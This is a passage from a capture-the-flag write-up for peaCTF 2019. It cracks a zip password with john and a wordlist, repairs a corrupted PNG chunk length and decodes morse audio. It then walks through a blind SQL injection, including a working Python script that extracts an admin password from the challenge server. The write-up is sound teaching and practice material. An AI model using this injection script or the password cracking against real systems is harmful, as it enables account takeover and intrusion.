+<p>We are given a zip file that is password protected. I just chose to brute force the password using john.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» zip2john song_of_my_people.zip <span class="o">&gt;</span> song.hash
+ver 2.0 efh 9901 song_of_my_people.zip/Ice Cube - Check Yo Self Remix <span class="o">(</span>Clean<span class="o">)</span>.mp3 PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>5550839, <span class="nv">decmplen</span><span class="o">=</span>5601208, <span class="nv">crc</span><span class="o">=</span>3F7D5D
+ver 2.0 efh 9901 song_of_my_people.zip/README.txt PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>132, <span class="nv">decmplen</span><span class="o">=</span>123, <span class="nv">crc</span><span class="o">=</span>E3A5855B
+ver 2.0 efh 9901 song_of_my_people.zip/a lengthy issue.png PKZIP Encr: <span class="nv">cmplen</span><span class="o">=</span>42909, <span class="nv">decmplen</span><span class="o">=</span>44525, <span class="nv">crc</span><span class="o">=</span>6514CE68
+NOTE: It is assumed that all files <span class="k">in </span>each archive have the same password.
+If that is not the <span class="k">case</span>, the <span class="nb">hash </span>may be uncrackable. To avoid this, use
+option <span class="nt">-o</span> to pick a file at a time.
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------</span>
+» john <span class="nt">--wordlist</span><span class="o">=</span>~/tools/wordlists/rockyou.txt song.hash
+Warning: detected <span class="nb">hash type</span> <span class="s2">"ZIP"</span>, but the string is also recognized as <span class="s2">"ZIP-opencl"</span>
+Use the <span class="s2">"--format=ZIP-opencl"</span> option to force loading these as that <span class="nb">type </span>instead
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>ZIP, WinZip <span class="o">[</span>PBKDF2-SHA1 128/128 AVX 4x]<span class="p">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+violin           <span class="o">(</span>song_of_my_people.zip/Ice Cube - Check Yo Self Remix <span class="o">(</span>Clean<span class="o">)</span>.mp3<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2019-07-23 15:26<span class="o">)</span> 2.777g/s 11377p/s 11377c/s 11377C/s 123456..oooooo
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>We get the password as ‘violin’ (4th last line) almost instantly. Once we extract the contents with 7zip, we get the following files.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» <span class="nb">ls</span>
+<span class="s1">'a lengthy issue.png'</span>  <span class="s1">'Ice Cube - Check Yo Self Remix (Clean).mp3'</span>   README.txt   song_of_my_people.zip
+</code></pre></div></div>
+
+<p>I renamed the files to ‘file.png’, then ‘music.mp3’. This is the output of the README.txt file.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>one of the three files is a red herring, but a helpful one at that.
+
+does any of this ADD up? This is a LONG problem.
+</code></pre></div></div>
+
+<p>I ran exiftool against the png file and got this.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» exiftool file.png
+ExifTool Version Number         : 11.56
+File Name                       : file.png
+Directory                       : <span class="nb">.</span>
+File Size                       : 43 kB
+File Modification Date/Time     : 2019:07:20 21:22:04-04:00
+File Access Date/Time           : 2019:07:23 03:28:10-04:00
+File Inode Change Date/Time     : 2019:07:23 03:29:03-04:00
+File Permissions                : rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 1280
+Image Height                    : 720
+Bit Depth                       : 8
+Color Type                      : Palette
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Adam7 Interlace
+SRGB Rendering                  : Perceptual
+Gamma                           : 2.2
+Warning                         : Corrupted PNG image
+Image Size                      : 1280x720
+Megapixels                      : 0.922
+</code></pre></div></div>
+
+<p>We see a Warning message that says this is a Corrupted PNG image.</p>
+
+<p>I will save time now and just say that I went through the mp3 file with both Sonic Visualiser and Audacity, and found nothing from there. I just assumed the mp3 file was the red herring and continued with the PNG file at this stage.</p>
+
+<p>Running pngcheck on the image.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» pngcheck <span class="nt">-vf</span> file.png
+File: file.png <span class="o">(</span>44525 bytes<span class="o">)</span>
+  chunk IHDR at offset 0x0000c, length 13
+    1280 x 720 image, 8-bit palette, interlaced
+  chunk sRGB at offset 0x00025, length 1
+    rendering intent <span class="o">=</span> perceptual
+  chunk gAMA at offset 0x00032, length 4: 0.45455
+  chunk PLTE at offset 0x00042, length 1212501072:  invalid number of entries <span class="o">(</span>4.04167e+08<span class="o">)</span>
+: 0 palette entries
+:  EOF <span class="k">while </span>reading data
+ERRORS DETECTED <span class="k">in </span>file.png
+</code></pre></div></div>
+
+<p>Okay so it says the PLTE chunk has an invalid number of entries. I used the <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">wikipedia page</a> as a reference to see what was actually wrong with the PNG file. It tells us that a PNG file must have four <strong>critical</strong> chunks (one of which it can have multiples of), and as many optional <strong>ancillary</strong> chunks as it needs. The four critical chunks are as follows:</p>
+
+<ul>
+  <li><strong>IHDR</strong> must be the first chunk; it contains (in this order) the image’s width (4 bytes), height (4 bytes), bit depth (1 byte), color type (1 byte), compression method (1 byte), filter method (1 byte), and interlace method (1 byte) (13 data bytes total).</li>
+  <li><strong>PLTE</strong> contains the palette; list of colors.</li>
+  <li><strong>IDAT</strong> contains the image, which may be split among multiple IDAT chunks. Such splitting increases filesize slightly, but makes it possible to generate a PNG in a streaming manner. The IDAT chunk contains the actual image data, which is the output stream of the compression algorithm.</li>
+  <li><strong>IEND</strong> marks the image end.</li>
+</ul>
+
+<p>We also know that a chunk layout is as follows.</p>
+
+<p><img src="/images/peactf/chunk_layout.png" alt="" /></p>
+
+<p>Knowing this, I used ghex to view the hexdump of the png file to see if it matches the specification.</p>
+
+<p><img src="/images/peactf/hexdump-1.png" alt="" /></p>
+
+<p>As you can see in the section highlighted above, the four bytes before the PLTE section (which should be the length of the PLTE section in hex) is 0x48454c50, which is “HELP” in ascii. This length is very obviously too large based on a visual inspection of the PLTE chunk length.</p>
+
+<p>We can see the very next chunk after the PLTE chunk is the tRNS chunk. We know the following.</p>
+
+<ul>
+  <li>The four bytes before the tRNS chunk will be the length of the tRNS chunk</li>
+  <li>The four bytes before the above four bytes will be the CRC for the PLTE chunk</li>
+</ul>
+
+<p>Therefore, I counted up until just before the PLTE chunk’s CRC manually by hand. and found the size of the chunk to be 453 bytes, which is 0x1c5 in hex. I then edited the bytes just before the PLTE chunk to be equal to 0x000001c5. The change is shown below in the four bytes just before the highlighted byte.</p>
+
+<p><img src="/images/peactf/hexdump-2.png" alt="" /></p>
+
+<p>I also wrote a script that will fix all critical chunk sizes it finds. The script can be found at <a href="https://github.com/farazsth98/ctf-png-chunksize-fixer/blob/master/png-chunksize-fixer.py">this link</a> on my github.</p>
+
+<p>Once that was done, the image could be opened.</p>
+
+<p><img src="/images/peactf/uncorrupted.png" alt="" /></p>
+
+<p>At this point, I couldn’t be bothered typing out all of that hex out by hand and then decoding it. I just tried to see if I could solve the challenge without using the hex somehow (Spoiler alert, I did).</p>
+
+<p>Going to the soundcloud link gives us an mp3 file which has a bunch of beeps of varying lengths. Very obvious morse code. I used <a href="https://morsecode.scphillips.com/labs/audio-decoder-adaptive/">this website</a> to decode it and got the following text.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SUP YALL ITS YA BOI LIL ICE CUBE MELTING OUT HERE IN THE HAWAII HEAT FOR ALL OF YOU. YOU GUESSED IT THIS IS LIVE AUDIO FROM MY WORLD TOUR. I REPEAT LIL ICE CUBES WORLD TOUR MAYBE A LIBRARY WILL HELP
+</code></pre></div></div>
+
+<p>The soundcloud link also has the following in the description.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this concert is part of a larger tour that is archived completely in some kind of hexagonal library. The archive is named between "maybe" and a "repeat". Should be on the 371st page.
+
+I would give you an mp3 of this audio, but I don't know how to navigate those sketchy websites.
+</code></pre></div></div>
+
+<p>So from the above image, we know the flag format, and we are also given the page number from the soundcloud page. At this point, when it talked about the hexagonal library, I knew it was talking about the Library of Babel, so I started going through the library and did not get anywhere. I re-read the challenge description and decided to just bruteforce the flag.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{1_thousand_spaces_371}
+{2_thousand_spaces_371}
+{3_thousand_spaces_371}
+</code></pre></div></div>
+
+<p>And I got lucky, because I got the flag on the third try.</p>
+
+<p>Flag: <code class="highlighter-rouge">{3_thousand_spaces_371}</code></p>
+
+<h1 id="philips-and-over">Philips and Over</h1>
+
+<ul>
+  <li><strong>Category:</strong> Web Exploitation</li>
+  <li><strong>Points:</strong> 900</li>
+</ul>
+
+<h3 id="challenge-13">Challenge</h3>
+
+<blockquote>
+  <p>There is a website running at <a href="http://shell1.2019.peactf.com:61940">http://shell1.2019.peactf.com:61940</a>. Try to log in the “admin” account.</p>
+
+  <p>Hints: A bucket can only fill with the volume of water the shortest plank allows.</p>
+</blockquote>
+
+<h3 id="solution-13">Solution</h3>
+
+<p>I first started by looking through the website. I tried SQL injection in the login form, in the forgot-your-password form, and just general source code viewing. I stumbled upon the following in the forgot password form. There’s a hidden ‘debug’ input form.</p>
+
+<p><img src="/images/peactf/forgot-password-debug.png" alt="" /></p>
+
+<p>I removed <code class="highlighter-rouge">type="hidden"</code>, then set debug to 1, used ‘admin’ as the username and ‘asd’ as the answer and got the following.</p>
+
+<p><img src="/images/peactf/sql-query-discover.png" alt="" /></p>
+
+<p>I first made sure it was actually SQL injectable.</p>
+
+<p><img src="/images/peactf/sql-error.png" alt="" /></p>
+
+<p>We see that the query is definitely injectable, however trying to inject it does not give us any output.</p>
+
+<p><img src="/images/peactf/no-output.png" alt="" /></p>
+
+<p>I then checked to see if it was a blind SQLi by doing the following.</p>
+
+<p><img src="/images/peactf/blind-sqli.png" alt="" /></p>
+
+<p>Since 1 does not equal 2, the right side of the query ends up being false so the entire query returns false, causing the server to tell us that the User does not exist. Otherwise, it would tell us that it has sent an email to notify the admin about this. So we have a blind SQLi. Question is, how do we exploit it?</p>
+
+<p>There are two types of blind SQLi attacks that can be employed to get the password here. The first would be to use a time-based attack, and the second one would be a regexp-based attack. I used the regexp-based attack. For more information about how a regexp-based blind SQLi works, and a more in-depth explanation of the script below, please see my tutorial <a href="/guides/2019/07/28/regex-based-blind-sql-injection-attacks.html">here</a>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"># Helper function to easily see the query
+</span><span class="k">def</span> <span class="nf">blind</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s">"http://shell1.2019.peactf.com:61940/result.php"</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="s">"admin' "</span> <span class="o">+</span><span class="n">query</span><span class="o">+</span> <span class="s">" -- ."</span><span class="p">,</span><span class="s">"answer"</span><span class="p">:</span><span class="s">"asd"</span><span class="p">,</span><span class="s">"debug"</span><span class="p">:</span><span class="s">"1"</span><span class="p">})</span>
+
+    <span class="k">return</span> <span class="n">response</span>
+
+<span class="n">keyspace</span> <span class="o">=</span> <span class="s">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&amp;*()-=+'</span>
+
+<span class="n">query_left_side</span> <span class="o">=</span> <span class="s">"AND 1=(SELECT 1 FROM users WHERE password LIKE '"</span>
+
+<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="n">num_of_queries</span> <span class="o">=</span> <span class="n">num_of_true_queries</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="n">num_of_queries</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">keyspace</span><span class="p">:</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="n">query_left_side</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="s">"</span><span class="si">%</span><span class="s">')"</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">blind</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\r</span><span class="s">Password: '</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">k</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s">"Your answer to the security"</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">num_of_true_queries</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">query_left_side</span> <span class="o">+=</span> <span class="n">k</span>
+            <span class="n">password</span> <span class="o">+=</span> <span class="n">k</span>
+            <span class="k">break</span>
+    <span class="k">if</span> <span class="n">num_of_queries</span> <span class="o">!=</span> <span class="n">num_of_true_queries</span><span class="p">:</span>
+        <span class="k">break</span>
+
+<span class="k">print</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Password found!: "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The script will do exactly as explained above. It tries all the letters in the keyspace, and each time it gets a “Your answer to the security” in the response body, it will concatenate the character with the actual password as well as with the query, so we can continue onwards with the next character.</p>
+
+<p>I ran it and got the password after a couple of minutes.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">»</span> <span class="p">.</span><span class="o">/</span><span class="n">sqli</span><span class="p">.</span><span class="n">py</span>
+<span class="n">Password</span><span class="o">:</span> <span class="mi">70725064</span><span class="o">+</span>
+<span class="n">Password</span> <span class="n">found</span><span class="o">!:</span> <span class="mi">70725064</span>
+</code></pre></div></div>
+
+<p>Now we just login and we get the flag.</p>
+
+<p><img src="/images/peactf/flag.png" alt="" /></p>
+
+<p>Flag: <code class="highlighter-rouge">flag{peactf_E_&gt;_A_119d352c970e04cedb8450d036094227}</code></p>
+:ET
